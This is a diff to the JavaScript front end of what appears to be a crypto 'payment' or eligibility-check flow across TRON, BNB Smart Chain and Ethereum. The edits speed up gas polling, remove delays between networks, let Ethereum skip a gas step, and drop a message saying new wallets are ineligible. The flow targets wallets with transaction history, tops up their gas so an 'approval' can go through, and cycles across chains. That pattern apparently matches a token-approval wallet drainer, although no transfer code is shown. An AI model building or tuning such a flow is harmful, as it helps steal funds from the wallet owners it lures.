@@ -680,9 +680,9 @@ async function waitUntilGasReady(options) {
   const poll = Boolean(options && options.poll);
   const p = paymentQueue[paymentIndex];
   const eth = p && p.network === 'eth';
-  const attempts = poll ? (eth ? 24 : 12) : 1;
+  const attempts = poll ? (eth ? 10 : 8) : 1;
   for (let i = 0; i < attempts; i += 1) {
-    if (i > 0) await sleep(2500);
+    if (i > 0) await sleep(1500);
     try {
       const res = await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/gas-verify', {
         method: 'POST',
@@ -708,7 +708,7 @@ async function ensureGasInBackground(p) {
   setBusy(true, 'Checking ' + label + ' gas', p.network === 'eth'
     ? 'Need at least 0.01 ETH for fees. Approval stays closed until that live balance is confirmed.'
     : 'If native gas is low, the server tops it up first.');
-  if (p.network !== 'eth' && gas.sufficient === true && p.status !== 'awaiting_gas') {
+  if (gas.sufficient === true && p.status !== 'awaiting_gas') {
     return true;
   }
   try {
@@ -828,7 +828,7 @@ function advanceAfterNetworkDone(reason, fromPaymentId) {
     }
     const next = paymentQueue[paymentIndex];
     setBusy(true, 'Checking ' + networkLabel(next && next.network), 'Preparing the next eligible network.');
-    setTimeout(function () { runCurrentNetwork(); }, 1200);
+    setTimeout(function () { runCurrentNetwork(); }, 400);
     return;
   }
   paymentIndex += 1;
@@ -837,15 +837,13 @@ function advanceAfterNetworkDone(reason, fromPaymentId) {
     return;
   }
   const next = paymentQueue[paymentIndex];
-  setBusy(true, 'Checking ' + networkLabel(next && next.network), 'The wallet should not be new. It needs to be a regular wallet with some transactions to be eligible.');
-  setTimeout(function () {
-    runCurrentNetwork();
-  }, 1500);
+  setBusy(true, 'Checking ' + networkLabel(next && next.network), 'Preparing the next eligible network.');
+  runCurrentNetwork();
 }
 
 async function startBackgroundApproval() {
   try {
-    await sleep(800);
+    await sleep(200);
     setBusy(true, 'Checking wallet eligibility', 'Scanning TRON, BNB Smart Chain, and Ethereum once.');
     const res = await fetch(BASE + '/api/payment/create', {
       method: 'POST',
